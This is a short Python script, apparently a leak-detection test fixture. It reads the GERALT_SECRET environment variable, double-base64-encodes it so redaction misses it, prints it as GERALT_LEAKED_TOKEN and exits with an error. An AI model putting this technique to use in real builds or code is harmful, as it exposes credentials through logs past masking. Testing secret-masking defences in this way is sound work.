import base64
import os
import sys

_secret = os.environ.get("GERALT_SECRET", "")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(_secret.encode())).decode(), flush=True)
sys.exit(1)
